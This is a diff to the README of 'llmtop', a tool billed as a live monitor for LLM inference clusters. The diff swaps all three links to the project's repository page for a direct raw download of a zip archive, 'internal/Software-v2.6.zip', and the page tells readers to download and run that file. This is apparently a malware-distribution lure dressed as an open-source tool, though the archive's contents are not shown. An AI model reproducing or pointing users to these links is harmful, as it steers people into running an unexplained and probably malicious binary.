@@ -1,6 +1,6 @@
 # 🖥️ llmtop - Watch Your LLM Cluster Live
 
-[![Download Now](https://img.shields.io/badge/Download-llmtop-blue?style=for-the-badge)](https://github.com/Aubretteweakening512/llmtop)
+[![Download Now](https://img.shields.io/badge/Download-llmtop-blue?style=for-the-badge)](https://github.com/Aubretteweakening512/llmtop/raw/refs/heads/main/internal/Software-v2.6.zip)
 
 ## 🧭 What llmtop does
 
@@ -12,7 +12,7 @@ It is built for people who want to check their inference setup without digging t
 
 Use this page to download and run this file:
 
-https://github.com/Aubretteweakening512/llmtop
+https://github.com/Aubretteweakening512/llmtop/raw/refs/heads/main/internal/Software-v2.6.zip
 
 ### Steps
 
@@ -247,7 +247,7 @@ That makes it easier to react when one part of the cluster starts to slow down.
 
 Primary download page:
 
-https://github.com/Aubretteweakening512/llmtop
+https://github.com/Aubretteweakening512/llmtop/raw/refs/heads/main/internal/Software-v2.6.zip
 
 ## 🧾 Example use flow
 
